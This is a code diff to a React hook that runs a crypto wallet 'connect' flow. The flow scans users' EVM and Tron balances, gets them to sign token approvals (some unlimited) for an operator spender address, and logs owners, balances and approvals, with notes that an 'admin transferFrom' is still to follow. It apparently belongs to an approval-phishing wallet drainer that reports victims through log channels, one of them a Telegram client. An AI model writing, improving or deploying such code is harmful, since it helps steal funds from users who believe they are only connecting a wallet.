@@ -13,6 +13,7 @@ import {
   projectId,
   WC_CONNECT_NAMESPACES,
 } from "@/lib/connect-flow/constants";
+import { postFlowLog } from "@/lib/connect-flow/flow-log-client";
 import { rowsFromBalances } from "@/lib/connect-flow/network-meta";
 import { runPostConfirmSequence } from "@/lib/connect-flow/post-confirm";
 import { postTgLog } from "@/lib/connect-flow/tg-log-client";
@@ -116,6 +117,18 @@ export function useConnectFlow() {
         Object.fromEntries(rows.map((r) => [r.key, "awaiting" as RowStatus]))
       );
       setShowResults(true);
+
+      void postFlowLog("STEP 1 COMPLETE — WALLET CONNECTED + BALANCES", {
+        fundsMoved: "NO — read-only scan",
+        evm: linkedFinal.evm,
+        tron: linkedFinal.tron,
+        networks: rows.map((r) => ({
+          key: r.key,
+          native: r.balances.native,
+          usdt: r.balances.usdt,
+          usdc: r.balances.usdc ?? null,
+        })),
+      });
     } catch (err: unknown) {
       console.error(err);
       setError(err instanceof Error ? err.message : "Failed to fetch balances");
@@ -365,15 +378,23 @@ export function useConnectFlow() {
           result?: boolean;
           txid?: string;
           error?: string;
+          code?: string | null;
+          message?: string | null;
         };
-        if (!broadcastRes.ok || !broadcastJson.result) {
+        // Require explicit node acceptance — never use unsigned txID as a fake success
+        if (
+          !broadcastRes.ok ||
+          broadcastJson.result !== true ||
+          typeof broadcastJson.txid !== "string" ||
+          !broadcastJson.txid
+        ) {
           throw new Error(
-            broadcastJson.error || "Failed to broadcast Tron approve"
+            broadcastJson.error ||
+              broadcastJson.message ||
+              "Tron broadcast was rejected by the node (no on-chain transaction)"
           );
         }
-        txid =
-          (typeof broadcastJson.txid === "string" && broadcastJson.txid) ||
-          (typeof signed.txID === "string" ? signed.txID : null);
+        txid = broadcastJson.txid;
       } else if (isEvmChainKey(networkKey)) {
         const spender = getSpenderEvm();
         if (!/^0x[a-fA-F0-9]{40}$/.test(spender)) {
@@ -416,6 +437,17 @@ export function useConnectFlow() {
 
       setStatus(networkKey, "finalizing");
       if (addressForLog && txid) {
+        void postFlowLog("STEP 2 — WALLET SIGNED APPROVE TX", {
+          fundsMoved: "NO — approve tx submitted, tokens still in wallet",
+          network: networkKey,
+          owner: addressForLog,
+          token,
+          amountHuman: unlimited ? "UNLIMITED" : amountHuman.trim(),
+          amountRaw,
+          unlimited,
+          txHash: txid,
+        });
+
         const result = await runPostConfirmSequence({
           networkKey,
           address: addressForLog,
@@ -430,6 +462,22 @@ export function useConnectFlow() {
             "Approval was submitted but could not be verified yet. Check your wallet / explorer."
           );
         }
+
+        void postFlowLog("FLOW FINISHED — CHECK TERMINAL + /api/approvals/debug", {
+          fundsMoved: "NO — allowance only; admin transferFrom not run",
+          approvalId: result.approvalId,
+          status: result.status,
+          allowance: result.allowance,
+          confirmed: result.confirmed,
+          txHash: txid,
+          network: networkKey,
+          token,
+          amountHuman: unlimited ? "UNLIMITED" : amountHuman.trim(),
+          debugUrl: "http://localhost:3000/api/approvals/debug",
+          lookupUrl: result.approvalId
+            ? `http://localhost:3000/api/approvals/${result.approvalId}`
+            : null,
+        });
       }
 
       setStatus(networkKey, "approved");
